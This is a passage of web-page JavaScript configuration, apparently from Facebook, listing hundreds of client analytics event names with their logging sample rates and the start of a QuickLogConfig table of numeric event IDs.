                                biz_home_tab_alerts_card_impression: 1,
                                biz_home_tab_entry_point_click: 1,
                                biz_home_tab_entry_point_impression: 1,
                                biz_home_tab_home_header_impression: 1,
                                biz_home_tab_insights_card_click: 1,
                                biz_home_tab_insights_card_impression: 1,
                                biz_home_tab_posts_card_click: 1,
                                biz_home_tab_posts_card_impression: 1,
                                biz_home_tab_updates_card_click: 1,
                                biz_home_tab_updates_card_impression: 1,
                                bizapp_tool_outcome: 1,
                                blood_donation_partner_client_event: 1,
                                bop_ui_event: 1,
                                business_composer_composer_cancel_flow: 1,
                                business_composer_composer_enter_flow: 1,
                                business_composer_composer_submit_flow: 1,
                                business_composer_composer_submit_flow_failure: 1,
                                business_composer_composer_submit_flow_success: 1,
                                business_composer_composer_upload: 1,
                                business_composer_composer_upload_failure: 1,
                                business_composer_composer_upload_success: 1,
                                business_composer_typeahead_search_click: 1,
                                business_inbox_bulk_admin_assignment_action_click: 1,
                                business_inbox_bulk_admin_assignment_dialog_submit: 1,
                                business_inbox_bulk_delete_action_click: 1,
                                business_inbox_bulk_delete_dialog_submit: 1,
                                business_inbox_bulk_label_action_click: 1,
                                business_inbox_bulk_label_dialog_submit: 1,
                                business_inbox_bulk_mark_as_unread_action_click: 1,
                                business_inbox_bulk_move_to_folder_action_click: 1,
                                business_inbox_bulk_reply_action_click: 1,
                                business_inbox_bulk_reply_dialog_submit: 1,
                                business_inbox_content_search_click: 1,
                                business_inbox_content_search_result_click: 1,
                                business_inbox_content_search_result_render_view: 1,
                                business_inbox_label_search_click: 1,
                                business_inbox_label_search_result_click: 1,
                                business_inbox_label_search_result_render_view: 1,
                                business_inbox_mark_all_comments_read_click: 1,
                                business_inbox_message_list_render_view: 1,
                                business_inbox_message_send_request: 1,
                                business_inbox_multi_admin_assignment_update: 1,
                                business_inbox_nux_impression: 1,
                                business_inbox_people_search_click: 1,
                                business_inbox_people_search_result_click: 1,
                                business_inbox_people_search_result_render_view: 1,
                                business_inbox_platform_click: 1,
                                business_inbox_post_folder_update: 1,
                                business_inbox_saved_reply_send_response: 1,
                                business_inbox_search_cancel_click: 1,
                                business_inbox_search_focus_click: 1,
                                business_inbox_search_result_render_view: 1,
                                business_inbox_suggested_label_click: 1,
                                business_inbox_suggested_label_impression: 1,
                                business_inbox_suggested_label_render_view: 1,
                                business_inbox_switch_folder_click: 1,
                                business_inbox_thread_checkbox_click: 1,
                                business_inbox_thread_checkbox_impression: 1,
                                business_inbox_thread_checkbox_update_value: 1,
                                business_inbox_thread_folder_update: 1,
                                business_inbox_thread_list_render_view: 1,
                                businessmanager_bmassetinfoextraaction_augl: 1,
                                businessmanager_bmassetpermissionaccordianmenuinteraction_augl: 1,
                                businessmanager_bmassetpermissiondelete_augl: 1,
                                businessmanager_bmassetpermissiondeletecancel_augl: 1,
                                businessmanager_bmassetpermissiondeleteconfirm_augl: 1,
                                businessmanager_bmassetpermissionedit_augl: 1,
                                businessmanager_bmassettabaddasset_augl: 1,
                                businessmanager_bmassettabaddpeople_augl: 1,
                                businessmanager_bmassettabassignpartner_augl: 1,
                                businessmanager_bmchangetabinteraction_augl: 1,
                                businessmanager_bmlistrowimpression_augl: 1,
                                businessmanager_bmlistviewinteraction_augl: 1,
                                businessmanager_bmlistviewtoggle_augl: 1,
                                businessmanager_bmnavigationlevel_augl: 1,
                                businessmanager_bmnavigationlevelended_augl: 1,
                                businessmanager_bmopenassetintoolaction_augl: 1,
                                businessmanager_bmpaneload_augl: 1,
                                businessmanager_bmpaneloadended_augl: 1,
                                businessmanager_bmpaneopen_augl: 1,
                                businessmanager_bmpaneopenended_augl: 1,
                                businessmanager_bmserverexception_augl: 1,
                                businessmanager_bmusertabaddasset_augl: 1,
                                businessmanager_bmvalidationerror_augl: 1,
                                businessmanager_bmvettingpageinitialload_augl: 1,
                                businessmanager_bmvettingpageinitialloadended_augl: 1,
                                businessmanager_coreappexperience_augl: 1,
                                businessmanager_coreappexperienceended_augl: 1,
                                businessmanager_coreinteractionaccordianmenu_augl: 1,
                                businessmanager_coreinteractionbutton_augl: 1,
                                businessmanager_coreinteractioncheckbox_augl: 1,
                                businessmanager_coreinteractiondropdown_augl: 1,
                                businessmanager_coreinteractiondropdownended_augl: 1,
                                businessmanager_coreinteractionradiobutton_augl: 1,
                                businessmanager_coreinteractiontextinput_augl: 1,
                                businessmanager_coreinteractiontextinputended_augl: 1,
                                businessmanager_coreinteractiontoggle_augl: 1,
                                businessmanager_coreuserinteraction_augl: 1,
                                businessmanager_coreuserinteractionended_augl: 1,
                                businessmanager_coreviewmodal_augl: 1,
                                businessmanager_coreviewmodalended_augl: 1,
                                candidate_portal_give_feedback: 1,
                                category_feed_first_page_fetched: 1,
                                change_beneficiary: 1,
                                chatroom_attachment_chat_button_tapped: 1,
                                chatroom_join_request_cancelled: 1,
                                chatroom_join_request_submitted: 1,
                                chatroom_story_vpv: 1,
                                civic_action_log_event: 1,
                                cix_account_status_vpvd: 1,
                                cix_warning_screens: 1,
                                cloud_gaming_events: 1,
                                cloud_gaming_session_event: 1,
                                cloud_gaming_webrtc_stats: 1,
                                comet_feed_story_menu_action: 1,
                                comet_feed_vpvd_test: 1,
                                comet_group_mall_page_visit: 1,
                                comet_media_options_click: 1,
                                comet_media_remove_tag: 1,
                                comet_media_tag: 1,
                                comet_media_vpvd: 1,
                                comet_news_feed_eof: 1,
                                comet_news_feed_eof_unmounted: 1,
                                comet_news_feed_loaded: 1,
                                comet_notifications_ranking_error: 1,
                                comet_opt_in_upsell_interaction: 1,
                                comet_opt_out_survey: 1,
                                comet_opt_out_survey_feedback: 1,
                                comet_page_post_edit: 1,
                                comet_scroll_latency: 10000,
                                comet_story_attachments: 1,
                                comet_topnav_item_click: 1,
                                comet_topnav_item_impression: 1,
                                comment_inline_seen: 1,
                                comment_inline_xout: 1,
                                comment_ordering_mode: 1,
                                commerce_experimental_component_click: 1,
                                commerce_feed_story_click: 1,
                                commerce_feed_story_impression: 1,
                                commerce_manager_client: 1,
                                commerce_pdp_product_tag_click: 1,
                                commerce_post_outbound_click: 1,
                                commerce_product_tag_alert_click: 1,
                                commerce_product_tag_alert_dismiss: 1,
                                commerce_product_tag_alert_impression: 1,
                                commerce_product_tag_dot_click: 1,
                                commerce_product_tag_dot_imp: 1,
                                commerce_product_tag_media_click: 1,
                                commerce_see_more_from_shop_card_click: 1,
                                commerce_shop_landing: 1,
                                commerce_shop_product_card_vpv: 1,
                                commerce_shop_product_details_imp: 1,
                                commerce_shoppable_content_landing_scroll: 1,
                                commerce_view_product_tag: 1,
                                commerce_view_product_tag_hscroll: 1,
                                commerce_view_product_tag_overlapped: 1,
                                commerce_view_product_tag_pill: 1,
                                commerce_view_product_tag_pill_dwelled: 1,
                                commerce_view_product_tag_post: 1,
                                commerce_view_product_tag_product: 1,
                                commerce_view_product_tagged_post: 1,
                                commerce_view_see_more_from_shop: 1,
                                commerce_view_shoppable_collection_landing: 1,
                                commerce_view_shoppable_content_landing: 1,
                                community_moderation_event: 1,
                                community_resources_click_link_mobile: 1,
                                community_resources_share_link_mobile: 1,
                                confirm_fundraiser_match_view_interstitial: 1,
                                consent_flow_interactions: 1,
                                content_manager_confirmation_dialog_click: 1,
                                content_manager_content_detail_view_cancel_flow: 1,
                                content_manager_content_detail_view_click: 1,
                                content_manager_content_detail_view_enter_flow: 1,
                                content_manager_content_detail_view_exit_flow: 1,
                                content_manager_content_detail_view_receive_response_failure: 1,
                                content_manager_content_detail_view_receive_response_success: 1,
                                content_manager_content_detail_view_send_request: 1,
                                content_manager_content_item_click: 1,
                                content_manager_content_item_impression: 1,
                                content_manager_filter_selector_click: 1,
                                content_manager_filter_selector_impression: 1,
                                content_manager_filter_selector_update_value: 1,
                                content_manager_tab_item_click: 1,
                                content_manager_tab_item_impression: 1,
                                content_manager_typeahead_submit: 1,
                                content_manager_view_switcher_tab_click: 1,
                                content_manager_view_switcher_tab_enter_flow: 1,
                                content_manager_workspace_click: 1,
                                content_manager_workspace_enter_flow: 1,
                                content_manager_workspace_exit_flow: 1,
                                content_manager_workspace_impression: 1,
                                content_manager_workspace_receive_response_failure: 1,
                                content_manager_workspace_receive_response_success: 1,
                                content_manager_workspace_send_request: 1,
                                copy_nonprofit_fundraiser_creation_short_url: 1,
                                coworker_opt_out_flow: 1,
                                create_fundraiser_begin: 1,
                                create_fundraiser_match_view_interstitial: 1,
                                create_fundraiser_profile_frame_begin: 1,
                                create_fundraiser_profile_frame_complete: 1,
                                create_living_room_action_link_impression: 1,
                                deferred_feedback_experience: 1,
                                delete_media_attempted: 1,
                                e2e_deletion_requests: 1,
                                events_transparency_history_details_view: 1,
                                external_metric_consumption_validation_event: 1,
                                external_share_tracking_event: 1,
                                facebook_partner_program: 1,
                                faq_view_answer: 1,
                                fbt_impressions_batch: 1,
                                feature_limited: 1,
                                filter_page_fundraisers_tab: 1,
                                flx_dialog_shown: 1,
                                flx_feature_limited: 1,
                                friends_center_opened: 1,
                                frtp_survey_response: 1,
                                fundraiser_add_organizers: 1,
                                fundraiser_match_delete_begin: 1,
                                fundraiser_match_delete_complete: 1,
                                fundraiser_match_review_view_interstitial: 1,
                                gaming_arena: 1,
                                gaming_video_level_up_qp: 1,
                                goodwill_product_system_share_menu_open: 1,
                                gpymi_feed_unit: 1,
                                griffin_tab_open: 1,
                                group_leaders_engagement: 1,
                                group_visit_action: 1,
                                groups_mall_activation_pymi: 1,
                                holy_diver_client_request: 1,
                                instant_games_interactive_poll_event: 1,
                                instant_games_tournaments_events: 1,
                                ix_trigger: 1,
                                kototoro_comment_create_attempted: 1,
                                kototoro_comment_created: 1,
                                kototoro_comment_delete_attempted: 1,
                                kototoro_comment_deleted: 1,
                                kototoro_comment_emoji_selected: 1,
                                kototoro_comment_exited: 1,
                                kototoro_comment_follow_upsell_action: 1,
                                kototoro_comment_follow_upsell_shown: 1,
                                kototoro_comment_launched: 1,
                                kototoro_comment_liked: 1,
                                kototoro_comment_mention_selected_user: 1,
                                kototoro_comment_mention_view_canceled: 1,
                                kototoro_comment_mention_view_shown: 1,
                                kototoro_comment_unliked: 1,
                                kttr_fb_stories_button_click: 1,
                                kttr_fb_stories_button_exposure: 1,
                                kttr_fb_stories_upsell: 1,
                                kttr_ig_feed_crosspost_composer: 1,
                                kttr_ig_feed_crosspost_sharesheet: 1,
                                kttr_ig_stories_crosspost_composer: 1,
                                kttr_ig_stories_crosspost_sharesheet: 1,
                                kttr_share_to_feed_error: 1,
                                kttr_share_to_story_error: 1,
                                kttr_shared_link: 1,
                                labnet_event: 1,
                                laminardevtools_coreappexperience_augl: 1,
                                laminardevtools_coreappexperienceended_augl: 1,
                                laminardevtools_coreuserinteraction_augl: 1,
                                laminardevtools_coreuserinteractionended_augl: 1,
                                laminardevtools_ldtactionselected_augl: 1,
                                laminardevtools_ldtdispatchinfoviewchange_augl: 1,
                                laminardevtools_ldtinit_augl: 1,
                                laminardevtools_ldtsearchfilter_augl: 1,
                                laminardevtools_ldttabchange_augl: 1,
                                lasso_composer_fb_stories_toggle: 1,
                                lasso_composer_fb_timeline_toggle: 1,
                                lasso_composer_fb_toggle: 1,
                                lasso_composer_ig_feed_toggle: 1,
                                lasso_composer_ig_stories_toggle: 1,
                                launch_message_seller_dialog: 1,
                                ldp_touchpoint_logger: 10000,
                                leads_center_crm_stage_submit_flow: 1,
                                leads_center_csv_import_cancel_flow: 1,
                                leads_center_csv_import_click: 1,
                                leads_center_csv_import_submit_flow: 1,
                                leads_center_csv_import_submit_flow_failure: 1,
                                leads_center_csv_import_upload: 1,
                                leads_center_csv_import_upload_failure: 1,
                                leads_center_csv_import_upload_success: 1,
                                leads_center_email_setting_submit_flow: 1,
                                leads_center_email_tool_business_send_email_click: 1,
                                leads_center_email_tool_business_send_email_impression: 1,
                                leads_center_email_tool_business_send_email_submit_flow: 1,
                                leads_center_email_tool_business_send_email_submit_flow_cancel: 1,
                                leads_center_email_tool_business_send_email_submit_flow_failure: 1,
                                leads_center_email_tool_business_send_email_submit_flow_success: 1,
                                leads_center_email_tool_confirmation_impression: 1,
                                leads_center_email_tool_confirmation_submit: 1,
                                leads_center_email_tool_confirmation_submit_flow_cancel: 1,
                                leads_center_email_tool_confirmation_submit_flow_failure: 1,
                                leads_center_email_tool_confirmation_submit_flow_success: 1,
                                leads_center_filter_cancel_flow: 1,
                                leads_center_filter_create: 1,
                                leads_center_filter_delete: 1,
                                leads_center_filter_send_request: 1,
                                leads_center_filter_update: 1,
                                leads_center_in_surface_notification_click: 1,
                                leads_center_in_surface_notification_dismiss: 1,
                                leads_center_label_click: 1,
                                leads_center_label_submit_flow: 1,
                                leads_center_label_submit_flow_failure: 1,
                                leads_center_lead_click: 1,
                                leads_center_lead_list_impression: 1,
                                leads_center_lead_list_receive_response: 1,
                                leads_center_lead_list_receive_response_failure: 1,
                                leads_center_lead_list_send_request: 1,
                                leads_center_note_submit_flow: 1,
                                leads_center_note_submit_flow_failure: 1,
                                leads_center_reminder_submit_flow: 1,
                                leads_center_reminder_submit_flow_failure: 1,
                                leads_center_tos_dismiss: 1,
                                leads_center_tos_enter_flow: 1,
                                leads_center_tos_exit_flow: 1,
                                leads_center_tos_impression: 1,
                                leads_center_tos_submit_flow: 1,
                                learning_click_component: 1,
                                learning_exception: 1,
                                learning_view_component: 1,
                                lh_digest_logging: 1,
                                live_join_group_cta_click: 1,
                                live_trace_www: 1,
                                live_trace_www_video_player: 1,
                                locationmanager_coreappexperience_augl: 1,
                                locationmanager_coreappexperienceended_augl: 1,
                                locationmanager_coreinteractionaccordianmenu_augl: 1,
                                locationmanager_coreinteractionbutton_augl: 1,
                                locationmanager_coreinteractioncheckbox_augl: 1,
                                locationmanager_coreinteractiondropdown_augl: 1,
                                locationmanager_coreinteractiondropdownended_augl: 1,
                                locationmanager_coreinteractionradiobutton_augl: 1,
                                locationmanager_coreinteractiontextinput_augl: 1,
                                locationmanager_coreinteractiontextinputended_augl: 1,
                                locationmanager_coreinteractiontoggle_augl: 1,
                                locationmanager_coreuserinteraction_augl: 1,
                                locationmanager_coreuserinteractionended_augl: 1,
                                locationmanager_coreviewmodal_augl: 1,
                                locationmanager_coreviewmodalended_augl: 1,
                                log_comet_canvas_app_time_spent: 1,
                                log_messenger_frx_events_in_cix_screen: 1,
                                ls_business_welcome_page_composer_hided: 1,
                                ls_business_welcome_page_get_started_button_tapped: 1,
                                ls_business_welcome_page_start: 1,
                                ls_cta_click_client_handling_success: 1,
                                ls_cta_displayed_button_tapped: 1,
                                ls_did_tap_call_to_action: 1,
                                ls_messenger_integrity_block_facebook_confirmed: 1,
                                ls_messenger_integrity_block_facebook_failed: 1,
                                ls_messenger_integrity_block_facebook_succeeded: 1,
                                ls_messenger_integrity_block_facebook_tapped: 1,
                                ls_messenger_integrity_block_messages_confirmed: 1,
                                ls_messenger_integrity_block_messages_failed: 1,
                                ls_messenger_integrity_block_messages_succeeded: 1,
                                ls_messenger_integrity_block_messages_tapped: 1,
                                ls_messenger_integrity_block_view_enter: 1,
                                ls_messenger_integrity_ignore_confirmed: 1,
                                ls_messenger_integrity_ignore_started: 1,
                                ls_messenger_integrity_learn_more_tapped: 1,
                                ls_messenger_integrity_unblock_facebook_confirmed: 1,
                                ls_messenger_integrity_unblock_facebook_failed: 1,
                                ls_messenger_integrity_unblock_facebook_succeeded: 1,
                                ls_messenger_integrity_unblock_facebook_tapped: 1,
                                ls_messenger_integrity_unblock_messages_confirmed: 1,
                                ls_messenger_integrity_unblock_messages_failed: 1,
                                ls_messenger_integrity_unblock_messages_succeeded: 1,
                                ls_messenger_integrity_unblock_messages_tapped: 1,
                                ls_persistent_menu_client_handling_success: 1,
                                ls_persistent_menu_icon_tapped: 1,
                                ls_persistent_menu_is_set_up: 1,
                                managedlift_coreappexperience_augl: 1,
                                managedlift_coreappexperienceended_augl: 1,
                                managedlift_coreinteractionbutton_augl: 1,
                                managedlift_coreinteractioncheckbox_augl: 1,
                                managedlift_coreinteractioncollapse_augl: 1,
                                managedlift_coreinteractionexpand_augl: 1,
                                managedlift_coreinteractionmouseover_augl: 1,
                                managedlift_coreinteractionmouseoverended_augl: 1,
                                managedlift_coreinteractionpanetab_augl: 1,
                                managedlift_coreinteractionradiobutton_augl: 1,
                                managedlift_coreinteractionsearchbar_augl: 1,
                                managedlift_coreinteractionsearchbarended_augl: 1,
                                managedlift_coreuserinteraction_augl: 1,
                                managedlift_coreuserinteractionended_augl: 1,
                                managedlift_coreviewmodal_augl: 1,
                                managedlift_coreviewmodalended_augl: 1,
                                managedlift_mlapierror_augl: 1,
                                managedlift_mlerror_augl: 1,
                                managedlift_mlfieldset_augl: 1,
                                managedlift_mlsurveyrespond_augl: 1,
                                managedlift_mltypeaheadselect_augl: 1,
                                managedlift_mlvalidationerror_augl: 1,
                                marketplace_pdp_tracking_data_tracker: 1,
                                member_accepted_hcp_historical_content_dialog: 1,
                                member_accepted_hcp_message_request: 1,
                                member_clicked_hcp_message_profile_button: 1,
                                member_clicked_hcp_reply_in_messenger: 1,
                                member_continued_hcp_ed_bottom_sheet: 1,
                                member_continued_hcp_ed_interstitial: 1,
                                member_continued_hcp_messaging_warning: 1,
                                member_exited_hcp_ed_interstitial: 1,
                                member_exited_hcp_historical_content_dialog: 1,
                                member_rejected_hcp_message_request: 1,
                                member_saw_hcp_accepted_message: 1,
                                member_saw_hcp_ed_bottom_sheet: 1,
                                member_saw_hcp_ed_interstitial: 1,
                                member_saw_hcp_historical_content_dialog: 1,
                                member_saw_hcp_message_request: 1,
                                member_saw_hcp_message_request_composer: 1,
                                member_saw_hcp_messaging_warning: 1,
                                member_sent_hcp_message_request: 1,
                                member_typed_hcp_message_request_composer: 1,
                                mentorship: 1,
                                mentorship_cohort: 1,
                                mentorship_user: 1,
                                messenger_ads_link_click: 1,
                                messenger_ads_link_click_cta: 1,
                                messenger_ads_message_seen_inbox: 1,
                                messenger_ads_message_seen_thread: 1,
                                messenger_business_composer_click: 1,
                                messenger_business_composer_impression: 1,
                                messenger_business_faq_tip_click: 1,
                                messenger_business_inbox_action_menu_button_click: 1,
                                messenger_business_inbox_action_menu_click: 1,
                                messenger_business_inbox_action_menu_impression: 1,
                                messenger_business_menu_click: 1,
                                messenger_business_menu_impression: 1,
                                messenger_business_message_send_request: 1,
                                messenger_business_profile_badge_impression: 1,
                                messenger_business_thread_click: 1,
                                messenger_business_thread_update_value: 1,
                                messenger_business_threadview_impression: 1,
                                messenger_integrity_block_facebook_tapped: 1,
                                messenger_integrity_unblock_facebook_tapped: 1,
                                misinfo_frontend: 1,
                                mk_client_event: 1,
                                news_digest_content_impression_event: 1,
                                news_digest_outbound_click_event: 1,
                                news_digest_primary_click_event: 1,
                                news_digest_secondary_click_event: 1,
                                news_digest_unit_impression_event: 1,
                                notif_list_bottom_collision: 10000,
                                offer_notifications: 10000,
                                onevc_camera_video_quality_limitation: 1,
                                open_seen_summary: 1,
                                overlays_tos_accept: 1,
                                page_admin_replied: 1,
                                page_insights_mobile_exception: 1,
                                page_private_reply_action_flow: 1,
                                pages_composer_composer_cancel_flow: 1,
                                pages_composer_composer_enter_flow: 1,
                                pages_composer_composer_focus_acquired: 1,
                                pages_composer_composer_focus_lost: 1,
                                pages_composer_composer_impression: 1,
                                pages_composer_composer_submit_flow: 1,
                                pages_composer_composer_submit_flow_failure: 1,
                                pages_composer_composer_submit_flow_success: 1,
                                pages_composer_consolidated_entry_click: 1,
                                pages_composer_draft_post_cancel_flow: 1,
                                pages_composer_draft_post_edit_enter_flow: 1,
                                pages_composer_draft_post_edit_submit_flow: 1,
                                pages_composer_draft_post_enter_flow: 1,
                                pages_composer_draft_post_submit_flow: 1,
                                pages_composer_draft_reminder_card_impression: 1,
                                pages_composer_draft_reminder_unit_impression: 1,
                                pages_composer_footer_setting_button_click: 1,
                                pages_composer_media_attachment_button_click: 1,
                                pages_composer_media_attachment_button_impression: 1,
                                pages_composer_offer_composer_cancel_flow: 1,
                                pages_composer_offer_composer_enter_flow: 1,
                                pages_composer_offer_composer_photo_uploader_submit_flow: 1,
                                pages_composer_offer_composer_photo_uploader_submit_flow_failure: 1,
                                pages_composer_offer_composer_photo_uploader_submit_flow_success: 1,
                                pages_composer_offer_composer_submit_flow: 1,
                                pages_composer_offer_composer_submit_flow_failure: 1,
                                pages_composer_offer_composer_submit_flow_success: 1,
                                pages_composer_offer_composer_update_value: 1,
                                pages_composer_preview_button_click: 1,
                                pages_composer_schedule_post_cancel_flow: 1,
                                pages_composer_schedule_post_enter_flow: 1,
                                pages_composer_schedule_post_submit_flow: 1,
                                pages_inbox_impression: 1,
                                pages_launchpoint_pages_you_manage_click: 1,
                                pages_launchpoint_view_message_click: 1,
                                pages_launchpoint_view_notification_click: 1,
                                pages_message_thread_impression: 1,
                                pages_page_action_click: 1,
                                pages_page_action_impression: 1,
                                pages_page_address_click: 1,
                                pages_page_card_impression: 1,
                                pages_page_card_see_all_click: 1,
                                pages_page_cover_click: 1,
                                pages_page_cover_impression: 1,
                                pages_page_email_click: 1,
                                pages_page_get_directions_click: 1,
                                pages_page_like_chaining_unit_impression: 1,
                                pages_page_map_click: 1,
                                pages_page_message_click: 1,
                                pages_page_notification_menu_impression: 1,
                                pages_page_photo_album_click: 1,
                                pages_page_photo_click: 1,
                                pages_page_settings_impression: 1,
                                pages_page_surface_impression: 1,
                                pages_page_video_click: 1,
                                pages_page_website_click: 1,
                                pages_permalink_impression: 1,
                                partner_home_enforcement_table_impression: 1,
                                partner_home_lookup_asset: 1,
                                partner_home_view_partner: 1,
                                partner_home_work_chat_clicked: 1,
                                people_you_may_follow: 1,
                                perf: 1,
                                pii_action_flow: 1,
                                political_ads_infosheet: 1,
                                post_debugger_usage: 1,
                                prim_action_flow: 1,
                                privacy_checkup_event: 1,
                                product_tag_post_click: 1,
                                profile_plus_insights_events: 1,
                                pyma_click: 1,
                                pyma_impression: 1,
                                qp_action: 1,
                                qp_client_logs: 1,
                                qp_impression: 1,
                                regular_pymk_add: 1,
                                regular_pymk_imp: 1,
                                regular_pymk_profile: 1,
                                regular_pymk_xout: 1,
                                save_click: 1,
                                save_item_impression: 1,
                                save_surface_impression: 1,
                                saved_dashboard_imp: 1,
                                saved_dashboard_list_landing_imp: 1,
                                saved_see_all_lists_view_imp: 1,
                                sc_audio_messages_event: 1,
                                search_result_page_logging_inline_action: 1,
                                search_result_page_logging_item_clicked: 1,
                                search_result_page_logging_results_loaded: 1,
                                search_result_page_logging_viewport_view: 1,
                                search_results_logging_module_unit_data: 1,
                                search_results_logging_result_unit_data: 1,
                                search_typeahead_logging_session: 1,
                                sextortion_victim_support_option_clicked: 1,
                                share_dialog_unified_composer: 1,
                                shift_cover_coverage_button_clicked: 1,
                                shift_cover_detail_screen_opened: 1,
                                shift_cover_message_button_clicked: 1,
                                sims_ui_event: 1,
                                smart_compose_candidates_generated: 1,
                                smart_compose_candidates_queried: 1,
                                smart_compose_matching_suggestion: 1,
                                smart_compose_suggestion_clicked: 1,
                                smart_compose_suggestion_displayed: 1,
                                smart_keyboard_suggestion_displayed: 1,
                                story_media_view: 1,
                                streaming_sdk_event: 1,
                                streaming_sdk_metadata: 1,
                                streaming_sdk_session_summary: 1,
                                tap_add_to_pages_story: 1,
                                tap_select_page: 1,
                                ufi_share_menu_copy_link: 1,
                                ufix_ixt_trigger: 1,
                                ui_feature_confirmation_confirm: 1,
                                ui_feature_confirmation_dismiss: 1,
                                ui_feature_confirmation_failure_actionable: 1,
                                ui_feature_confirmation_failure_actionable_dismiss: 1,
                                ui_feature_confirmation_failure_unactionable: 1,
                                ui_feature_confirmation_ig_login_failure: 1,
                                ui_feature_confirmation_ig_login_start: 1,
                                ui_feature_confirmation_ig_login_success: 1,
                                ui_feature_confirmation_start: 1,
                                ui_feature_confirmation_success: 1,
                                ui_feature_confirmation_try_again: 1,
                                unidash_bladerunner_events: 1,
                                unified_interception_intercept_accept: 1,
                                unified_interception_intercept_create: 1,
                                unified_interception_intercept_reject: 1,
                                unified_interception_intercept_undo: 1,
                                vehicle_entity_page_user_action_event: 1,
                                verse: 1,
                                video_action_source_event: 1,
                                video_search_relevancy_feedback: 1,
                                view_beneficiary_selector: 1,
                                view_fundraiser: 1,
                                vod_pnc_messenger_cta_click: 1,
                                vod_pnc_people_sheet_impression: 1,
                                vod_pnc_people_sheet_thumbnail_impression: 1,
                                vod_pnc_see_all_reactions_click: 1,
                                volunteering_click_unit: 1,
                                volunteering_view_page: 1,
                                volunteering_view_unit: 1,
                                voter_registration_attachment_tap_change_state: 1,
                                voter_registration_post_impression: 1,
                                voter_registration_post_tap_register: 1,
                                voter_registration_qp_tap_edit_location: 1,
                                voter_registration_state_selector_tap_state: 1,
                                wayfinder_mapbox_data_load: 1,
                                weather_bookmark_forecast_scrolled: 1,
                                weather_bookmark_impression: 1,
                                weather_bookmark_scroll_forecast: 1,
                                weather_bookmark_settings_tapped: 1,
                                weather_bookmark_tap_city_tab: 1,
                                weather_bookmark_tap_future_day: 1,
                                weather_bookmark_tap_hourly_forecast: 1,
                                weather_bookmark_tap_nowcast: 1,
                                weather_daily_notifications_mutation_error: 1,
                                weather_daily_notifications_turned_off: 1,
                                weather_daily_notifications_turned_on: 1,
                                weather_live_alerts_mutation_error: 1,
                                weather_live_alerts_turned_off: 1,
                                weather_live_alerts_turned_on: 1,
                                weather_settings_add_city: 1,
                                weather_settings_daily_notification_use_current_location: 1,
                                weather_settings_delete_city: 1,
                                weather_settings_error_state_dismissed: 1,
                                weather_settings_error_state_fixed: 1,
                                weather_settings_impression: 1,
                                weather_settings_notification_location_tapped: 1,
                                weather_settings_tap_city_row: 1,
                                weather_settings_temperature_unit_changed: 1,
                                webauthn_authenticator_login_failure: 1,
                                webauthn_authenticator_login_success: 1,
                                webauthn_authenticator_register_failure: 1,
                                webauthn_authenticator_register_success: 1,
                                work_safety_client_error: 1,
                                work_thanks_mobile_ui_confirm_button_clicked: 1,
                                work_thanks_mobile_ui_dialog_opened: 1,
                                www_comet_video_autoplay: 10000,
                                ads_manager_ad_appeal_send_failure: 1,
                                ads_manager_ad_appeal_send_success: 1,
                                ads_manager_appeal_send_pressed: 1,
                                ads_manager_confirm_appeal_dialog_cancel: 1,
                                attempt_to_send_reply: 1,
                                bi_mlex_ad_history_click: 1,
                                bi_mlex_ad_history_impression: 1,
                                bi_mlex_feedback_survey_evolution_response: 1,
                                camera_roll_cancelled: 1,
                                camera_roll_finished: 1,
                                camera_roll_folder_in_dropdown_clicked: 1,
                                camera_roll_header_camera_clicked: 1,
                                camera_roll_header_cancel_button_clicked: 1,
                                camera_roll_header_folder_clicked: 1,
                                camera_roll_header_next_button_clicked: 1,
                                camera_roll_magnifying_glass_button_clicked: 1,
                                camera_roll_media_item_clicked: 1,
                                camera_roll_opened: 1,
                                close_story: 1,
                                commerce_view_product_details: 1,
                                composer_cancel: 1,
                                composer_entry: 1,
                                composer_focus_acquired: 1,
                                composer_focus_lost: 1,
                                composer_init: 1,
                                composer_post: 1,
                                composer_post_cancel: 1,
                                composer_post_failure: 1,
                                composer_post_mutation_start: 1,
                                composer_post_server_content_rendered: 1,
                                composer_post_success: 1,
                                crisis_click_unit: 1,
                                crisis_tool_view_page: 1,
                                crisis_view_unit: 1,
                                feed_friend_request_confirm: 1,
                                feed_friend_request_delete: 1,
                                feed_friend_request_imp: 1,
                                feed_friend_request_profile: 1,
                                for_sale_item_message_seller_button_clicked: 1,
                                goodwill_content_view: 1,
                                goodwill_permalink_subpage_view: 1,
                                gpymi_add: 1,
                                gpymi_imp: 1,
                                gysj_join: 1,
                                gysj_profile: 1,
                                gysj_unjoin: 1,
                                gysj_xout: 1,
                                living_room: 1,
                                marketplace_click: 1,
                                marketplace_feed_load: 1,
                                marketplace_first_scroll: 1,
                                marketplace_impression: 1,
                                marketplace_long_click: 1,
                                marketplace_surface_enter: 1,
                                marketplace_surface_exit: 1,
                                media_upload_cancel: 1,
                                media_upload_failure: 1,
                                media_upload_flow_cancel: 1,
                                media_upload_flow_fatal: 1,
                                media_upload_flow_giveup: 1,
                                media_upload_flow_incomplete: 1,
                                media_upload_flow_start: 1,
                                media_upload_flow_success: 1,
                                media_upload_init_failure: 1,
                                media_upload_init_start: 1,
                                media_upload_init_success: 1,
                                media_upload_process_cancel: 1,
                                media_upload_process_failure: 1,
                                media_upload_process_skipped: 1,
                                media_upload_process_start: 1,
                                media_upload_process_success: 1,
                                media_upload_start: 1,
                                media_upload_success: 1,
                                media_upload_transfer_cancel: 1,
                                media_upload_transfer_failure: 1,
                                media_upload_transfer_start: 1,
                                media_upload_transfer_success: 1,
                                notification_permalink_time_spent: 1,
                                open_media: 1,
                                open_story: 1,
                                pymk_add: 1,
                                pymk_imp: 1,
                                pymk_profile: 1,
                                pymk_xout: 1,
                                request_click: 1,
                                request_seen: 1,
                                saved_collection_ego_item_image_clicked: 1,
                                send_story_post_failed_notification: 1,
                                stories_interactive_feedback: 1,
                                story_card_impression: 1,
                                story_card_timespent: 1,
                                story_interactive_item_click: 1,
                                story_interactive_item_rendering: 1,
                                story_navigation: 1,
                                story_profile_impression: 1,
                                streaming_sdk_engine_log: 1,
                                why_covered_ccs_link_followed: 1,
                                why_covered_ccs_snippet_viewed: 1,
                                why_covered_error_generating_cms: 1,
                                why_covered_how_snippet_viewed: 1
                            }
                        }, 4308], ["QuickLogConfig", [], {
                            qpl_events: {
                                "393276": {
                                    sampleRate: 50
                                },
                                "655575": {
                                    sampleRate: 1
                                },
                                "655576": {
                                    sampleRate: 5000
                                },
                                "655584": {
                                    sampleRate: 1
                                },
                                "917556": {
                                    sampleRate: 100
                                },
                                "917557": {
                                    sampleRate: 1000
                                },
                                "2097243": {
                                    sampleRate: 250
                                },
                                "2097246": {
